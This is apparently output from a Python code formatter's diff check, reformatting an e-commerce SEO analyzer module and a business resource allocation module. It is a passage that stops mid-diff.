-        total_keyword_occurrences = sum(text.count(keyword.lower()) for keyword in keywords)
+        total_keyword_occurrences = sum(
+            text.count(keyword.lower()) for keyword in keywords
+        )
         return total_keyword_occurrences / total_words if total_words > 0 else 0
 
     def _analyze_title_structure(self, title: str) -> Dict[str, Any]:
         """Analyze title structure for SEO."""
-        rules = self.marketplace_seo_rules.get(self.marketplace, self.marketplace_seo_rules["ebay"])
+        rules = self.marketplace_seo_rules.get(
+            self.marketplace, self.marketplace_seo_rules["ebay"]
+        )
 
         title_length = len(title)
         optimal_length = rules["optimal_title_length"]
 
         analysis = {
             "length": title_length,
             "optimal_length_range": optimal_length,
-            "length_score": 100 if optimal_length[0] <= title_length <= optimal_length[1] else 50,
+            "length_score": (
+                100 if optimal_length[0] <= title_length <= optimal_length[1] else 50
+            ),
             "word_count": len(title.split()),
             "has_brand": self._detect_brand_in_title(title),
             "has_model": self._detect_model_in_title(title),
             "capitalization_score": self._analyze_title_capitalization(title),
         }
 
         return analysis
 
     def _analyze_description_structure(self, description: str) -> Dict[str, Any]:
         """Analyze description structure for SEO."""
-        rules = self.marketplace_seo_rules.get(self.marketplace, self.marketplace_seo_rules["ebay"])
+        rules = self.marketplace_seo_rules.get(
+            self.marketplace, self.marketplace_seo_rules["ebay"]
+        )
 
         desc_length = len(description)
         optimal_length = rules["optimal_description_length"]
 
         analysis = {
             "length": desc_length,
             "optimal_length_range": optimal_length,
-            "length_score": 100 if optimal_length[0] <= desc_length <= optimal_length[1] else 50,
+            "length_score": (
+                100 if optimal_length[0] <= desc_length <= optimal_length[1] else 50
+            ),
             "paragraph_count": len([p for p in description.split("\n\n") if p.strip()]),
             "sentence_count": len([s for s in description.split(".") if s.strip()]),
             "has_call_to_action": self._detect_call_to_action(description),
             "readability_score": self._calculate_readability_score(description),
         }
@@ -454,11 +556,15 @@
         return analysis
 
     def _analyze_bullet_points(self, bullet_points: List[str]) -> Dict[str, Any]:
         """Analyze bullet points for SEO."""
         if not bullet_points:
-            return {"count": 0, "score": 0, "recommendations": ["Add bullet points for better structure"]}
+            return {
+                "count": 0,
+                "score": 0,
+                "recommendations": ["Add bullet points for better structure"],
+            }
 
         analysis = {
             "count": len(bullet_points),
             "average_length": sum(len(bp) for bp in bullet_points) / len(bullet_points),
             "keyword_coverage": self._analyze_bullet_point_keywords(bullet_points),
@@ -481,13 +587,16 @@
             hierarchy_score += 25
 
         return {
             "hierarchy_score": hierarchy_score,
             "has_title": "title" in content and bool(content["title"]),
-            "has_description": "description" in content and bool(content["description"]),
-            "has_bullet_points": "bullet_points" in content and bool(content["bullet_points"]),
-            "has_meta_description": "meta_description" in content and bool(content["meta_description"]),
+            "has_description": "description" in content
+            and bool(content["description"]),
+            "has_bullet_points": "bullet_points" in content
+            and bool(content["bullet_points"]),
+            "has_meta_description": "meta_description" in content
+            and bool(content["meta_description"]),
         }
 
     def _analyze_meta_elements(self, content: Dict[str, Any]) -> Dict[str, Any]:
         """Analyze meta elements for SEO."""
         meta_analysis = {
@@ -512,11 +621,12 @@
 
     def _detect_model_in_title(self, title: str) -> bool:
         """Detect if title contains a model identifier."""
         # Look for model patterns (numbers, alphanumeric codes)
         import re
-        model_patterns = [r'\b\d+\b', r'\b[A-Z]\d+\b', r'\b\d+[A-Z]\b']
+
+        model_patterns = [r"\b\d+\b", r"\b[A-Z]\d+\b", r"\b\d+[A-Z]\b"]
         return any(re.search(pattern, title) for pattern in model_patterns)
 
     def _analyze_title_capitalization(self, title: str) -> int:
         """Analyze title capitalization for SEO."""
         words = title.split()
@@ -526,26 +636,43 @@
         capitalized_words = sum(1 for word in words if word[0].isupper())
         return int((capitalized_words / len(words)) * 100)
 
     def _detect_call_to_action(self, description: str) -> bool:
         """Detect call-to-action phrases in description."""
-        cta_phrases = ["buy now", "order today", "shop now", "get yours", "limited time", "act fast"]
+        cta_phrases = [
+            "buy now",
+            "order today",
+            "shop now",
+            "get yours",
+            "limited time",
+            "act fast",
+        ]
         return any(phrase in description.lower() for phrase in cta_phrases)
 
-    def _analyze_bullet_point_keywords(self, bullet_points: List[str]) -> Dict[str, Any]:
+    def _analyze_bullet_point_keywords(
+        self, bullet_points: List[str]
+    ) -> Dict[str, Any]:
         """Analyze keyword usage in bullet points."""
         all_text = " ".join(bullet_points).lower()
         word_count = len(all_text.split())
 
         # Count action words
-        action_words = ["premium", "professional", "high-quality", "durable", "reliable"]
+        action_words = [
+            "premium",
+            "professional",
+            "high-quality",
+            "durable",
+            "reliable",
+        ]
         action_word_count = sum(all_text.count(word) for word in action_words)
 
         return {
             "total_words": word_count,
             "action_words_count": action_word_count,
-            "action_word_density": action_word_count / word_count if word_count > 0 else 0,
+            "action_word_density": (
+                action_word_count / word_count if word_count > 0 else 0
+            ),
         }
 
     def _score_bullet_point_structure(self, bullet_points: List[str]) -> int:
         """Score bullet point structure."""
         if not bullet_points:
@@ -564,11 +691,13 @@
         avg_length = sum(lengths) / len(lengths)
         if 20 <= avg_length <= 100:  # Optimal length range
             score += 30
 
         # Check for variety in starting words
-        starting_words = [bp.split()[0].lower() if bp.split() else "" for bp in bullet_points]
+        starting_words = [
+            bp.split()[0].lower() if bp.split() else "" for bp in bullet_points
+        ]
         unique_starts = len(set(starting_words))
         if unique_starts > len(bullet_points) * 0.7:  # 70% unique starts
             score += 30
 
         return score
@@ -579,11 +708,11 @@
 
         if not all_text:
             return {"readability_score": 0, "grade_level": "N/A"}
 
         # Simple readability calculation
-        sentences = [s for s in all_text.split('.') if s.strip()]
+        sentences = [s for s in all_text.split(".") if s.strip()]
         words = all_text.split()
 
         if not sentences or not words:
             return {"readability_score": 0, "grade_level": "N/A"}
 
@@ -613,13 +742,17 @@
             "avg_sentence_length": avg_sentence_length,
             "total_sentences": len(sentences),
             "total_words": len(words),
         }
 
-    async def _analyze_marketplace_compliance(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _analyze_marketplace_compliance(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Analyze marketplace-specific compliance."""
-        rules = self.marketplace_seo_rules.get(self.marketplace, self.marketplace_seo_rules["ebay"])
+        rules = self.marketplace_seo_rules.get(
+            self.marketplace, self.marketplace_seo_rules["ebay"]
+        )
         compliance_score = 0
         issues = []
 
         # Check title compliance
         title = content.get("title", "")
@@ -627,36 +760,48 @@
             title_length = len(title)
             optimal_title = rules["optimal_title_length"]
             if optimal_title[0] <= title_length <= optimal_title[1]:
                 compliance_score += 25
             else:
-                issues.append(f"Title length ({title_length}) not optimal ({optimal_title[0]}-{optimal_title[1]})")
+                issues.append(
+                    f"Title length ({title_length}) not optimal ({optimal_title[0]}-{optimal_title[1]})"
+                )
 
         # Check description compliance
         description = content.get("description", "")
         if description:
             desc_length = len(description)
             optimal_desc = rules["optimal_description_length"]
             if optimal_desc[0] <= desc_length <= optimal_desc[1]:
                 compliance_score += 25
             else:
-                issues.append(f"Description length ({desc_length}) not optimal ({optimal_desc[0]}-{optimal_desc[1]})")
+                issues.append(
+                    f"Description length ({desc_length}) not optimal ({optimal_desc[0]}-{optimal_desc[1]})"
+                )
 
         # Check keyword density
         keywords = content.get("keywords", [])
         if keywords:
             all_text = self._extract_all_text(content)
-            keyword_density = self._calculate_overall_keyword_density(all_text, keywords)
+            keyword_density = self._calculate_overall_keyword_density(
+                all_text, keywords
+            )
             optimal_density = rules["keyword_density_range"]
             if optimal_density[0] <= keyword_density <= optimal_density[1]:
                 compliance_score += 25
             else:
-                issues.append(f"Keyword density ({keyword_density:.3f}) not optimal ({optimal_density[0]}-{optimal_density[1]})")
+                issues.append(
+                    f"Keyword density ({keyword_density:.3f}) not optimal ({optimal_density[0]}-{optimal_density[1]})"
+                )
 
         # Check required sections
         required_sections = rules["important_sections"]
-        present_sections = [section for section in required_sections if section in content and content[section]]
+        present_sections = [
+            section
+            for section in required_sections
+            if section in content and content[section]
+        ]
         if len(present_sections) == len(required_sections):
             compliance_score += 25
         else:
             missing = set(required_sections) - set(present_sections)
             issues.append(f"Missing required sections: {', '.join(missing)}")
@@ -673,20 +818,28 @@
         """Calculate overall SEO score from analysis results."""
         scores = {}
 
         # Extract scores from different analyses
         if "keyword_analysis" in analysis_results:
-            scores["keyword"] = analysis_results["keyword_analysis"].get("overall_keyword_score", 0)
+            scores["keyword"] = analysis_results["keyword_analysis"].get(
+                "overall_keyword_score", 0
+            )
 
         if "structure_analysis" in analysis_results:
-            scores["structure"] = analysis_results["structure_analysis"].get("structure_score", 0)
+            scores["structure"] = analysis_results["structure_analysis"].get(
+                "structure_score", 0
+            )
 
         if "readability_analysis" in analysis_results:
-            scores["readability"] = analysis_results["readability_analysis"].get("readability_score", 0)
+            scores["readability"] = analysis_results["readability_analysis"].get(
+                "readability_score", 0
+            )
 
         if "marketplace_analysis" in analysis_results:
-            scores["marketplace"] = analysis_results["marketplace_analysis"].get("compliance_score", 0)
+            scores["marketplace"] = analysis_results["marketplace_analysis"].get(
+                "compliance_score", 0
+            )
 
         # Calculate weighted average
         total_score = 0
         total_weight = 0
 
@@ -695,55 +848,82 @@
             total_score += score * weight
             total_weight += weight
 
         return total_score / total_weight if total_weight > 0 else 0
 
-    def _generate_seo_recommendations(self, analysis_results: Dict[str, Any]) -> List[str]:
+    def _generate_seo_recommendations(
+        self, analysis_results: Dict[str, Any]
+    ) -> List[str]:
         """Generate SEO recommendations based on analysis."""
         recommendations = []
 
         # Keyword recommendations
         if "keyword_analysis" in analysis_results:
-            keyword_score = analysis_results["keyword_analysis"].get("overall_keyword_score", 0)
+            keyword_score = analysis_results["keyword_analysis"].get(
+                "overall_keyword_score", 0
+            )
             if keyword_score < 70:
-                recommendations.append("Improve keyword optimization in title and description")
+                recommendations.append(
+                    "Improve keyword optimization in title and description"
+                )
 
         # Structure recommendations
         if "structure_analysis" in analysis_results:
-            structure_score = analysis_results["structure_analysis"].get("structure_score", 0)
+            structure_score = analysis_results["structure_analysis"].get(
+                "structure_score", 0
+            )
             if structure_score < 70:
-                recommendations.append("Improve content structure with better hierarchy")
+                recommendations.append(
+                    "Improve content structure with better hierarchy"
+                )
 
         # Readability recommendations
         if "readability_analysis" in analysis_results:
-            readability_score = analysis_results["readability_analysis"].get("readability_score", 0)
+            readability_score = analysis_results["readability_analysis"].get(
+                "readability_score", 0
+            )
             if readability_score < 60:
-                recommendations.append("Improve readability with shorter sentences and simpler words")
+                recommendations.append(
+                    "Improve readability with shorter sentences and simpler words"
+                )
 
         # Marketplace compliance recommendations
         if "marketplace_analysis" in analysis_results:
-            compliance_score = analysis_results["marketplace_analysis"].get("compliance_score", 0)
+            compliance_score = analysis_results["marketplace_analysis"].get(
+                "compliance_score", 0
+            )
             if compliance_score < 80:
                 recommendations.append("Address marketplace compliance issues")
                 issues = analysis_results["marketplace_analysis"].get("issues", [])
                 recommendations.extend(issues[:3])  # Add top 3 specific issues
 
         return recommendations[:10]  # Limit to top 10 recommendations
 
     # Missing helper methods
-    def _generate_keyword_specific_recommendations(self, keyword: str, count: int, density: float, in_title: bool, in_description: bool) -> List[str]:
+    def _generate_keyword_specific_recommendations(
+        self,
+        keyword: str,
+        count: int,
+        density: float,
+        in_title: bool,
+        in_description: bool,
+    ) -> List[str]:
         """Generate keyword-specific recommendations."""
         recommendations = []
 
         if not in_title:
             recommendations.append(f"Add '{keyword}' to title for better SEO")
         if not in_description:
             recommendations.append(f"Include '{keyword}' in description")
         if density < 0.01:
-            recommendations.append(f"Increase '{keyword}' density (currently {density:.3f})")
+            recommendations.append(
+                f"Increase '{keyword}' density (currently {density:.3f})"
+            )
         elif density > 0.03:
-            recommendations.append(f"Reduce '{keyword}' density (currently {density:.3f})")
+            recommendations.append(
+                f"Reduce '{keyword}' density (currently {density:.3f})"
+            )
 
         return recommendations
 
     def _calculate_structure_score(self, structure_analysis: Dict[str, Any]) -> float:
         """Calculate structure score from analysis."""
@@ -765,11 +945,13 @@
         hierarchy_analysis = structure_analysis.get("content_hierarchy", {})
         score += hierarchy_analysis.get("hierarchy_score", 0) * 0.2
 
         return min(100.0, score)
 
-    def _generate_structure_recommendations(self, structure_analysis: Dict[str, Any]) -> List[str]:
+    def _generate_structure_recommendations(
+        self, structure_analysis: Dict[str, Any]
+    ) -> List[str]:
         """Generate structure recommendations."""
         recommendations = []
 
         title_analysis = structure_analysis.get("title_analysis", {})
         if title_analysis.get("length_score", 0) < 80:
@@ -783,11 +965,13 @@
         if bullet_analysis.get("count", 0) == 0:
             recommendations.append("Add bullet points for better structure")
 
         return recommendations
 
-    async def _calculate_content_seo_score(self, content: Dict[str, Any], keywords: List[str]) -> float:
+    async def _calculate_content_seo_score(
+        self, content: Dict[str, Any], keywords: List[str]
+    ) -> float:
         """Calculate content SEO score."""
         try:
             # Simple SEO score calculation
             score = 0.0
 
@@ -808,11 +992,13 @@
                     score += 15
 
             # Keyword score
             if keywords:
                 all_text = self._extract_all_text(content)
-                keyword_density = self._calculate_overall_keyword_density(all_text, keywords)
+                keyword_density = self._calculate_overall_keyword_density(
+                    all_text, keywords
+                )
                 if 0.01 <= keyword_density <= 0.03:
                     score += 25
                 elif keyword_density > 0:
                     score += 15
 
@@ -823,11 +1009,13 @@
             return score
 
         except Exception:
             return 50.0
 
-    async def _optimize_for_ranking(self, content: Dict[str, Any], keywords: List[str]) -> tuple[Dict[str, Any], List[str]]:
+    async def _optimize_for_ranking(
+        self, content: Dict[str, Any], keywords: List[str]
+    ) -> tuple[Dict[str, Any], List[str]]:
         """Optimize content for ranking."""
         optimized_content = content.copy()
         improvements = []
 
         # Add keywords to title if missing
@@ -839,27 +1027,33 @@
                     improvements.append(f"Added '{keyword}' to title")
                     break
 
         return optimized_content, improvements
 
-    async def _optimize_for_visibility(self, content: Dict[str, Any], keywords: List[str]) -> tuple[Dict[str, Any], List[str]]:
+    async def _optimize_for_visibility(
+        self, content: Dict[str, Any], keywords: List[str]
+    ) -> tuple[Dict[str, Any], List[str]]:
         """Optimize content for visibility."""
         optimized_content = content.copy()
         improvements = []
 
         # Enhance description with keywords
         if "description" in content and keywords:
             description = content["description"]
             for keyword in keywords[:1]:  # Add top keyword
                 if keyword.lower() not in description.lower():
-                    optimized_content["description"] = f"{description} Features {keyword} technology."
+                    optimized_content["description"] = (
+                        f"{description} Features {keyword} technology."
+                    )
                     improvements.append(f"Enhanced description with '{keyword}'")
                     break
 
         return optimized_content, improvements
 
-    async def _optimize_for_conversion(self, content: Dict[str, Any]) -> tuple[Dict[str, Any], List[str]]:
+    async def _optimize_for_conversion(
+        self, content: Dict[str, Any]
+    ) -> tuple[Dict[str, Any], List[str]]:
         """Optimize content for conversion."""
         optimized_content = content.copy()
         improvements = []
 
         # Add call-to-action if missing
@@ -867,16 +1061,20 @@
             description = content["description"]
             cta_phrases = ["buy now", "order today", "shop now"]
             has_cta = any(phrase in description.lower() for phrase in cta_phrases)
 
             if not has_cta:
-                optimized_content["description"] = description + " Order now for fast shipping!"
+                optimized_content["description"] = (
+                    description + " Order now for fast shipping!"
+                )
                 improvements.append("Added call-to-action")
 
         return optimized_content, improvements
 
-    def _generate_keyword_recommendations(self, keyword_analysis: Dict[str, Any]) -> List[str]:
+    def _generate_keyword_recommendations(
+        self, keyword_analysis: Dict[str, Any]
+    ) -> List[str]:
         """Generate keyword recommendations based on analysis."""
         recommendations = []
 
         for keyword, analysis in keyword_analysis.items():
             score = analysis.get("optimization_score", 0)
@@ -886,6 +1084,6 @@
                 if not analysis.get("in_description", False):
                     recommendations.append(f"Include '{keyword}' in description")
                 if analysis.get("density", 0) < 0.01:
                     recommendations.append(f"Increase '{keyword}' usage")
 
-        return recommendations[:5]  # Limit to top 5 recommendations
\ No newline at end of file
+        return recommendations[:5]  # Limit to top 5 recommendations
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/seo_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/resource_allocator.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/resource_allocator.py	2025-06-19 04:03:40.039658+00:00
@@ -12,20 +12,25 @@
 from typing import Dict, List, Optional, Any, Tuple
 from dataclasses import dataclass
 import heapq
 
 from fs_agt_clean.core.models.business_models import (
-    ResourceAllocation, BusinessInitiative, Priority, BusinessObjective,
-    FinancialMetrics, RiskLevel
+    ResourceAllocation,
+    BusinessInitiative,
+    Priority,
+    BusinessObjective,
+    FinancialMetrics,
+    RiskLevel,
 )
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class ResourceConstraint:
     """Resource constraint definition."""
+
     resource_type: str
     total_available: float
     allocated: float
     reserved: float
     unit: str
@@ -33,10 +38,11 @@
 
 
 @dataclass
 class ResourceDemand:
     """Resource demand from an initiative."""
+
     initiative_id: str
     resource_type: str
     amount_requested: float
     priority_score: float
     urgency: Priority
@@ -45,500 +51,555 @@
 
 
 @dataclass
 class AllocationResult:
     """Result of resource allocation optimization."""
+
     allocations: List[ResourceAllocation]
     total_satisfaction: float
     unmet_demands: List[ResourceDemand]
     resource_utilization: Dict[str, float]
     optimization_score: float
     recommendations: List[str]
 
 
 class ResourceAllocator:
     """Advanced resource allocation engine using optimization algorithms."""
-    
+
     def __init__(self):
         """Initialize the resource allocator."""
         # Resource types and their characteristics
         self.resource_types = {
             "budget": {
                 "unit": "USD",
                 "divisible": True,
                 "transferable": True,
-                "depreciation_rate": 0.0
+                "depreciation_rate": 0.0,
             },
             "personnel": {
                 "unit": "FTE",
                 "divisible": False,
                 "transferable": True,
-                "depreciation_rate": 0.0
+                "depreciation_rate": 0.0,
             },
             "time": {
                 "unit": "hours",
                 "divisible": True,
                 "transferable": False,
-                "depreciation_rate": 0.0
+                "depreciation_rate": 0.0,
             },
             "technology": {
                 "unit": "licenses",
                 "divisible": False,
                 "transferable": True,
-                "depreciation_rate": 0.1
+                "depreciation_rate": 0.1,
             },
             "equipment": {
                 "unit": "units",
                 "divisible": False,
                 "transferable": True,
-                "depreciation_rate": 0.15
-            }
+                "depreciation_rate": 0.15,
+            },
         }
-        
+
         # Priority weights for allocation decisions
         self.priority_weights = {
             Priority.CRITICAL: 1.0,
             Priority.HIGH: 0.8,
             Priority.MEDIUM: 0.6,
-            Priority.LOW: 0.4
+            Priority.LOW: 0.4,
         }
-        
+
         logger.info("Resource allocator initialized")
-    
+
     async def optimize_allocation(
         self,
         initiatives: List[BusinessInitiative],
         constraints: List[ResourceConstraint],
-        optimization_objective: str = "maximize_value"
+        optimization_objective: str = "maximize_value",
     ) -> AllocationResult:
         """
         Optimize resource allocation across initiatives.
-        
+
         Args:
             initiatives: List of business initiatives requiring resources
             constraints: Available resource constraints
             optimization_objective: Optimization goal ("maximize_value", "minimize_risk", "balance")
-            
+
         Returns:
             AllocationResult with optimized allocations
         """
         try:
             # Convert initiatives to resource demands
             demands = await self._extract_resource_demands(initiatives)
-            
+
             # Apply optimization algorithm
             if optimization_objective == "maximize_value":
-                allocations = await self._maximize_value_allocation(demands, constraints)
+                allocations = await self._maximize_value_allocation(
+                    demands, constraints
+                )
             elif optimization_objective == "minimize_risk":
-                allocations = await self._minimize_risk_allocation(demands, constraints, initiatives)
+                allocations = await self._minimize_risk_allocation(
+                    demands, constraints, initiatives
+                )
             else:  # balance
-                allocations = await self._balanced_allocation(demands, constraints, initiatives)
-            
+                allocations = await self._balanced_allocation(
+                    demands, constraints, initiatives
+                )
+
             # Calculate satisfaction and utilization
             satisfaction = self._calculate_satisfaction(demands, allocations)
             utilization = self._calculate_utilization(constraints, allocations)
-            
+
             # Identify unmet demands
             unmet_demands = self._identify_unmet_demands(demands, allocations)
-            
+
             # Calculate optimization score
             optimization_score = self._calculate_optimization_score(
                 satisfaction, utilization, len(unmet_demands), len(demands)
             )
-            
+
             # Generate recommendations
             recommendations = await self._generate_recommendations(
                 allocations, unmet_demands, constraints, utilization
             )
-            
+
             return AllocationResult(
                 allocations=allocations,
                 total_satisfaction=satisfaction,
                 unmet_demands=unmet_demands,
                 resource_utilization=utilization,
                 optimization_score=optimization_score,
-                recommendations=recommendations
+                recommendations=recommendations,
             )
-            
+
         except Exception as e:
             logger.error(f"Error in resource allocation optimization: {e}")
             return await self._create_fallback_allocation(initiatives, constraints)
-    
-    async def _extract_resource_demands(self, initiatives: List[BusinessInitiative]) -> List[ResourceDemand]:
+
+    async def _extract_resource_demands(
+        self, initiatives: List[BusinessInitiative]
+    ) -> List[ResourceDemand]:
         """Extract resource demands from business initiatives."""
         demands = []
-        
+
         for initiative in initiatives:
             # Calculate priority score
             priority_score = self.priority_weights.get(initiative.priority, 0.6)
-            
+
             # Adjust priority score based on ROI
             roi_bonus = min(initiative.estimated_roi / 100, 0.5)
             priority_score += roi_bonus
-            
+
             # Extract resource requirements
             for resource_type, amount in initiative.required_resources.items():
                 if resource_type in self.resource_types:
                     # Generate alternative amounts (80%, 100%, 120% of requested)
                     alternatives = [amount * 0.8, amount, amount * 1.2]
-                    
+
                     demand = ResourceDemand(
                         initiative_id=initiative.initiative_id,
                         resource_type=resource_type,
                         amount_requested=amount,
                         priority_score=priority_score,
                         urgency=initiative.priority,
                         justification=f"Required for {initiative.name}",
-                        alternative_amounts=alternatives
+                        alternative_amounts=alternatives,
                     )
                     demands.append(demand)
-        
+
         return demands
-    
+
     async def _maximize_value_allocation(
-        self,
-        demands: List[ResourceDemand],
-        constraints: List[ResourceConstraint]
+        self, demands: List[ResourceDemand], constraints: List[ResourceConstraint]
     ) -> List[ResourceAllocation]:
         """Allocate resources to maximize overall value."""
         allocations = []
-        
+
         # Create constraint tracking
         available_resources = {
-            constraint.resource_type: constraint.total_available - constraint.allocated - constraint.reserved
+            constraint.resource_type: constraint.total_available
+            - constraint.allocated
+            - constraint.reserved
             for constraint in constraints
         }
-        
+
         # Sort demands by priority score (highest first)
         sorted_demands = sorted(demands, key=lambda d: d.priority_score, reverse=True)
-        
+
         for demand in sorted_demands:
             available = available_resources.get(demand.resource_type, 0)
-            
+
             if available >= demand.amount_requested:
                 # Full allocation
                 allocated_amount = demand.amount_requested
                 allocation_score = demand.priority_score
             elif available > 0:
                 # Partial allocation
                 allocated_amount = available
-                allocation_score = demand.priority_score * (allocated_amount / demand.amount_requested)
+                allocation_score = demand.priority_score * (
+                    allocated_amount / demand.amount_requested
+                )
             else:
                 # No allocation possible
                 continue
-            
+
             if allocated_amount > 0:
                 allocation = ResourceAllocation(
                     initiative_id=demand.initiative_id,
                     resource_type=demand.resource_type,
                     amount=allocated_amount,
                     unit=self.resource_types[demand.resource_type]["unit"],
                     justification=demand.justification,
                     priority_score=allocation_score,
-                    expected_impact={"value_score": allocation_score}
+                    expected_impact={"value_score": allocation_score},
                 )
                 allocations.append(allocation)
-                
+
                 # Update available resources
                 available_resources[demand.resource_type] -= allocated_amount
-        
+
         return allocations
-    
+
     async def _minimize_risk_allocation(
         self,
         demands: List[ResourceDemand],
         constraints: List[ResourceConstraint],
-        initiatives: List[BusinessInitiative]
+        initiatives: List[BusinessInitiative],
     ) -> List[ResourceAllocation]:
         """Allocate resources to minimize overall risk."""
         allocations = []
-        
+
         # Create initiative risk mapping
-        initiative_risks = {
-            init.initiative_id: len(init.risks) for init in initiatives
-        }
-        
+        initiative_risks = {init.initiative_id: len(init.risks) for init in initiatives}
+
         # Create constraint tracking
         available_resources = {
-            constraint.resource_type: constraint.total_available - constraint.allocated - constraint.reserved
+            constraint.resource_type: constraint.total_available
+            - constraint.allocated
+            - constraint.reserved
             for constraint in constraints
         }
-        
+
         # Sort demands by risk (lowest risk first) and priority
         def risk_priority_score(demand):
             risk_count = initiative_risks.get(demand.initiative_id, 0)
             risk_penalty = risk_count * 0.1
             return demand.priority_score - risk_penalty
-        
+
         sorted_demands = sorted(demands, key=risk_priority_score, reverse=True)
-        
+
         for demand in sorted_demands:
             available = available_resources.get(demand.resource_type, 0)
-            
+
             # Conservative allocation (prefer 80% of requested to reduce risk)
             conservative_amount = demand.amount_requested * 0.8
-            
+
             if available >= conservative_amount:
                 allocated_amount = conservative_amount
             elif available > 0:
                 allocated_amount = min(available, demand.amount_requested * 0.6)
             else:
                 continue
-            
+
             if allocated_amount > 0:
                 risk_score = 1.0 - (initiative_risks.get(demand.initiative_id, 0) * 0.1)
-                
+
                 allocation = ResourceAllocation(
                     initiative_id=demand.initiative_id,
                     resource_type=demand.resource_type,
                     amount=allocated_amount,
                     unit=self.resource_types[demand.resource_type]["unit"],
                     justification=f"Conservative allocation for {demand.justification}",
                     priority_score=demand.priority_score * risk_score,
-                    expected_impact={"risk_mitigation": risk_score}
+                    expected_impact={"risk_mitigation": risk_score},
                 )
                 allocations.append(allocation)
-                
+
                 # Update available resources
                 available_resources[demand.resource_type] -= allocated_amount
-        
+
         return allocations
-    
+
     async def _balanced_allocation(
         self,
         demands: List[ResourceDemand],
         constraints: List[ResourceConstraint],
-        initiatives: List[BusinessInitiative]
+        initiatives: List[BusinessInitiative],
     ) -> List[ResourceAllocation]:
         """Allocate resources using a balanced approach."""
         allocations = []
-        
+
         # Create constraint tracking
         available_resources = {
-            constraint.resource_type: constraint.total_available - constraint.allocated - constraint.reserved
+            constraint.resource_type: constraint.total_available
+            - constraint.allocated
+            - constraint.reserved
             for constraint in constraints
         }
-        
+
         # Group demands by resource type
         demands_by_type = {}
         for demand in demands:
             if demand.resource_type not in demands_by_type:
                 demands_by_type[demand.resource_type] = []
             demands_by_type[demand.resource_type].append(demand)
-        
+
         # Allocate each resource type separately
         for resource_type, type_demands in demands_by_type.items():
             available = available_resources.get(resource_type, 0)
-            
+
             if available <= 0:
                 continue
-            
+
             # Calculate total requested
             total_requested = sum(d.amount_requested for d in type_demands)
-            
+
             if total_requested <= available:
                 # Full allocation for all
                 for demand in type_demands:
                     allocation = ResourceAllocation(
                         initiative_id=demand.initiative_id,
                         resource_type=demand.resource_type,
                         amount=demand.amount_requested,
                         unit=self.resource_types[demand.resource_type]["unit"],
                         justification=demand.justification,
                         priority_score=demand.priority_score,
-                        expected_impact={"allocation_ratio": 1.0}
+                        expected_impact={"allocation_ratio": 1.0},
                     )
                     allocations.append(allocation)
             else:
                 # Proportional allocation based on priority
                 total_priority = sum(d.priority_score for d in type_demands)
-                
+
                 for demand in type_demands:
                     if total_priority > 0:
                         allocation_ratio = demand.priority_score / total_priority
                         allocated_amount = available * allocation_ratio
                     else:
                         allocated_amount = available / len(type_demands)
-                    
+
                     allocation = ResourceAllocation(
                         initiative_id=demand.initiative_id,
                         resource_type=demand.resource_type,
                         amount=allocated_amount,
                         unit=self.resource_types[demand.resource_type]["unit"],
                         justification=f"Proportional allocation: {demand.justification}",
                         priority_score=demand.priority_score,
-                        expected_impact={"allocation_ratio": allocated_amount / demand.amount_requested}
+                        expected_impact={
+                            "allocation_ratio": allocated_amount
+                            / demand.amount_requested
+                        },
                     )
                     allocations.append(allocation)
-        
+
         return allocations
-    
-    def _calculate_satisfaction(self, demands: List[ResourceDemand], allocations: List[ResourceAllocation]) -> float:
+
+    def _calculate_satisfaction(
+        self, demands: List[ResourceDemand], allocations: List[ResourceAllocation]
+    ) -> float:
         """Calculate overall satisfaction score."""
         if not demands:
             return 1.0
-        
+
         # Create allocation mapping
         allocation_map = {}
         for allocation in allocations:
             key = (allocation.initiative_id, allocation.resource_type)
             allocation_map[key] = allocation.amount
-        
+
         total_satisfaction = 0.0
         total_weight = 0.0
-        
+
         for demand in demands:
             key = (demand.initiative_id, demand.resource_type)
             allocated = allocation_map.get(key, 0)
-            
+
             if demand.amount_requested > 0:
                 satisfaction = min(allocated / demand.amount_requested, 1.0)
             else:
                 satisfaction = 1.0
-            
+
             # Weight by priority
             weight = demand.priority_score
             total_satisfaction += satisfaction * weight
             total_weight += weight
-        
+
         return total_satisfaction / total_weight if total_weight > 0 else 0.0
-    
-    def _calculate_utilization(self, constraints: List[ResourceConstraint], allocations: List[ResourceAllocation]) -> Dict[str, float]:
+
+    def _calculate_utilization(
+        self,
+        constraints: List[ResourceConstraint],
+        allocations: List[ResourceAllocation],
+    ) -> Dict[str, float]:
         """Calculate resource utilization rates."""
         utilization = {}
-        
+
         # Calculate allocated amounts by resource type
         allocated_by_type = {}
         for allocation in allocations:
             if allocation.resource_type not in allocated_by_type:
                 allocated_by_type[allocation.resource_type] = 0
             allocated_by_type[allocation.resource_type] += allocation.amount
-        
+
         # Calculate utilization rates
         for constraint in constraints:
             total_available = constraint.total_available
             already_allocated = constraint.allocated + constraint.reserved
             new_allocated = allocated_by_type.get(constraint.resource_type, 0)
-            
+
             if total_available > 0:
-                utilization[constraint.resource_type] = (already_allocated + new_allocated) / total_available
+                utilization[constraint.resource_type] = (
+                    already_allocated + new_allocated
+                ) / total_available
             else:
                 utilization[constraint.resource_type] = 0.0
-        
+
         return utilization
-    
-    def _identify_unmet_demands(self, demands: List[ResourceDemand], allocations: List[ResourceAllocation]) -> List[ResourceDemand]:
+
+    def _identify_unmet_demands(
+        self, demands: List[ResourceDemand], allocations: List[ResourceAllocation]
+    ) -> List[ResourceDemand]:
         """Identify demands that were not fully met."""
         unmet = []
-        
+
         # Create allocation mapping
         allocation_map = {}
         for allocation in allocations:
             key = (allocation.initiative_id, allocation.resource_type)
             allocation_map[key] = allocation.amount
-        
+
         for demand in demands:
             key = (demand.initiative_id, demand.resource_type)
             allocated = allocation_map.get(key, 0)
-            
+
             if allocated < demand.amount_requested:
                 # Create unmet demand with remaining amount
                 unmet_demand = ResourceDemand(
                     initiative_id=demand.initiative_id,
                     resource_type=demand.resource_type,
                     amount_requested=demand.amount_requested - allocated,
                     priority_score=demand.priority_score,
                     urgency=demand.urgency,
                     justification=f"Unmet portion of: {demand.justification}",
-                    alternative_amounts=demand.alternative_amounts
+                    alternative_amounts=demand.alternative_amounts,
                 )
                 unmet.append(unmet_demand)
-        
